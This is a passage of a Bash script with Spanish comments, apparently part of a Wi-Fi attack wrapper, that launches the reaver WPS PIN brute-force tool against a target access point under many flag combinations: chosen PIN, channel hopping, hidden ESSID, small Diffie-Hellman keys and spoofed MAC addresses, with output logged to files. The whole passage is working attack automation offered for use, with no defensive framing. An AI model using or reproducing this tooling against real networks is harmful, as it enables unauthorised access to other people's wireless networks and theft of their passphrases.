Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8h-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin  Reaver Booleanos Programa ninguna -e essid fin###

###Empezar Reaver Booleanos programa EMPEZAR con -e essid###

########
if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########PIN Adds

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8e-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

#######EMPEZAR Reaver opciones de canales de salto

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == n || $USE_DHSMALL == N ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8he-no dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin Todo sin --dh-small -S fin#####

###Empezar Todas --dh-small -S Empezar#####

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########PIN añade

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6-no dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7-no-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

#######Empezar Reaver opciones de canales de salto

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver5h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60  --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver6h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vvv -x 60 -r $RX1:$RY1 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver7h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == y || $USE_PIN1 == Y ]] && [[ $CHANNEL1 == 0 ]] && [[ $AP_HIDDEN == y || $AP_HIDDEN == Y ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver8h-dh" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -r $RX1:$RY1 -L -E -vvv -N -T 1 -t 20 -d 0  -x 30 --pin=$WPS_PIN1 --session=/etc/reaver/testpin-$WPS_PIN1-$MACSTRIP.wpc --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

###fin  Reaver Program Booleanos ninguna -e essid fin###

###Empezar Reaver Program Booleanos Comience con -e essid###

########
if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver1e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -vvv -x 60 -L -S --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver2e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -vvv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver3e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

########

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 != 0 ]] && [[ $AP_HIDDEN == m || $AP_HIDDEN == M ]] && [[ $USE_DHSMALL == y || $USE_DHSMALL == Y ]]; then

REAVER_MENU_fn

AIRDASSOC_fn

Eterm -g 80x10-1+1 --cmod "red" --no-cursor  -T "Reaver4e-dh" -e sh -c "reaver -i $MON -a -f -c $CHANNEL1 -b $TARGETAP1 -e "$NMEWARN2" -r $RX1:$RY1 -L -S -E -vvv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

TIMING_LOCKED_fn

	fi

